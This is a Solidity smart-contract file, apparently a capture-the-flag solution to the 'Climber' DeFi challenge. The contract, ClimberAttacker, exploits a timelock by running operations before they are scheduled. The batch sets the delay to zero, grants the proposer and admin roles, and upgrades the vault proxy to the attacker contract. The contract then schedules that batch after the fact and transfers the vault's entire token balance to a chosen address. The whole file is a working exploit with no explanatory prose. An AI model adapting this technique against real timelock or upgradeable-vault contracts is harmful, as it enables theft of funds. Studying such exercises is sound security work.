pragma solidity =0.8.25;

import {AccessControl} from "@openzeppelin/contracts/access/AccessControl.sol";
import {OwnableUpgradeable} from "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
import {UUPSUpgradeable} from "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";

interface IClimberTimeLock{
    function execute(address[] calldata targets, uint256[] calldata values, bytes[] calldata dataElements, bytes32 salt) external;
    function schedule(address[] calldata targets,uint256[] calldata values,bytes[] calldata dataElements,bytes32 salt) external;
    function grantRole(bytes32 role, address account) external;
}

interface IERC20{
    function transfer(address to, uint256 value) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    
}
/* 
    function updateDelay(uint64 newDelay) external
    function schedule(
        address[] calldata targets,
        uint256[] calldata values,
        bytes[] calldata dataElements,
        bytes32 salt
    ) 
    upgradeToAndCall(address newImplementation, bytes memory data)

    updateDelay, schedule, proxyUpdate
*/


contract ClimberAttacker is AccessControl, UUPSUpgradeable  {
    IClimberTimeLock lock;
    address vault;
    address token;
    address recovery;
    bytes32 constant ADMIN_ROLE = 0xa49807205ce4d355092ef5a8a18f56e8913cf4a201fbe287825b095693c21775;
    bytes32 constant PROPOSER_ROLE = 0xb09aa5aeb3702cfd50b6b62bc4532604938f21248a27a1d5ca736082b6819cc1;
    //bytes32 constant PROPOSER_ROLE = keccak256("PROPOSER_ROLE");
    address[]  targets = new address[](4);
    uint256[]  values = new uint256[](4);
    bytes[]  dataElements = new bytes[](4);
    
    
    constructor(address _lock, address _vault, address _token,address _recovery){
        lock = IClimberTimeLock(_lock);
        vault = _vault;
        token = _token;
        recovery = _recovery;
    }

    function attack() external{
        bytes memory data = abi.encodeWithSignature("insertOperation(address,address,address,address,address)", address(lock), vault,address(this),token,recovery);
        for(uint8 i=0; i<3; i++){
            targets[i] = address(lock);
            values[i] = 0;
        }
        //targets[1] = address(this);
        targets[3] = vault;
        
        
        dataElements[0] = abi.encodeWithSignature("updateDelay(uint64)", 0);
        dataElements[1] = abi.encodeWithSignature("grantRole(bytes32,address)",PROPOSER_ROLE,vault);
        dataElements[2] = abi.encodeWithSignature("grantRole(bytes32,address)",ADMIN_ROLE,vault);
        dataElements[3] = abi.encodeWithSignature("upgradeToAndCall(address,bytes)",address(this),data);
        

        lock.execute(targets, values, dataElements, keccak256("1234123"));


    }

    function insertOperation(address _lock, address _vault, address proxy, address _token, address _recovery) external{

        bytes32 _ADMIN_ROLE = 0xa49807205ce4d355092ef5a8a18f56e8913cf4a201fbe287825b095693c21775;
        bytes32 _PROPOSER_ROLE = 0xb09aa5aeb3702cfd50b6b62bc4532604938f21248a27a1d5ca736082b6819cc1;

        address[] memory _targets = new address[](4);
        uint256[] memory _values = new uint256[](4);
        bytes[] memory _dataElements = new bytes[](4);
        bytes memory data = abi.encodeWithSignature("insertOperation(address,address,address,address,address)", _lock, _vault,proxy,_token,_recovery);

        for(uint8 i=0; i<4; i++){
            _targets[i] = _lock;
            _values[i] = 0;
        }

        _targets[3] = _vault;

        _dataElements[0] = abi.encodeWithSignature("updateDelay(uint64)", 0);
        _dataElements[1] = abi.encodeWithSignature("grantRole(bytes32,address)",_PROPOSER_ROLE, _vault);
        _dataElements[2] = abi.encodeWithSignature("grantRole(bytes32,address)",_ADMIN_ROLE, _vault);
        _dataElements[3] = abi.encodeWithSignature("upgradeToAndCall(address,bytes)",proxy, data);

        IClimberTimeLock(_lock).schedule(_targets, _values, _dataElements, keccak256("1234123"));
        IERC20(_token).transfer(_recovery,IERC20(_token).balanceOf(address(this)));
        
        
    }

    
    function _authorizeUpgrade(address newImplementation) internal override {}
}